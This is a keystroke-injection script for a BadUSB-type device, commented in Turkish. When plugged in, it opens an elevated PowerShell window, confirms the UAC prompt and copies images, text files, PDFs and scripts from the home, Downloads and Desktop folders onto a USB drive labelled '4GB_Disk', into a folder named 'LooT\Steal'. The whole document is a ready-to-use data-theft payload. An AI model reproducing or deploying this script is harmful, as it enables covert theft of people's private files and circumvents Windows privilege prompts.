// @KekikAkademi Edit ~
delay(500);
press("ALT SHIFT"); // Yerel Klavye Düzeni Değiştiriliyor
delay(500);
// @KekikAkademi Edit #

layout("US"); // US Klavye Düzeni Seçiyor
typingSpeed(0,0);	// Hızlı Yazması İçin
press("GUI r") // Windows + R
delay(500) 
type("powershell");
delay(500);
press("CTRL SHIFT ENTER");
delay(500);
press("ALT y");
delay(750);
type("$usbPath = ((gwmi win32_volume -f 'label=''4GB_Disk''').Name+'\\LooT\\Steal\\')\n");
type("New-Item -Path $usbpath/$env:COMPUTERNAME/ -ItemType Directory\n") // Yeni Klasör Oluşturuluyor >> $usbpath/$env:COMPUTERNAME/
var filetypes = ["jpg", "png", "txt", "pdf", "html", "ps1", "py"]
for (var i = 0; i < filetypes.length; i++) {
	type("copy *." + filetypes[i] + " $usbpath/$env:COMPUTERNAME/\n")
  	type("copy */*." + filetypes[i] + " $usbpath/$env:COMPUTERNAME/\n")
    type("copy Downloads/*." + filetypes[i] + " $usbpath/$env:COMPUTERNAME/\n")
  	type("copy Desktop/*." + filetypes[i] + " $usbpath/$env:COMPUTERNAME/\n")
  	type("copy Desktop/*/*." + filetypes[i] + " $usbpath/$env:COMPUTERNAME/\n")
}
type("exit\n");  // PowerShell Kapatılıyor

// @KekikAkademi Edit ~
delay(500);
press("ALT SHIFT"); // Yerel Klavye Düzeni Değiştiriliyor
delay(500);
// @KekikAkademi Edit #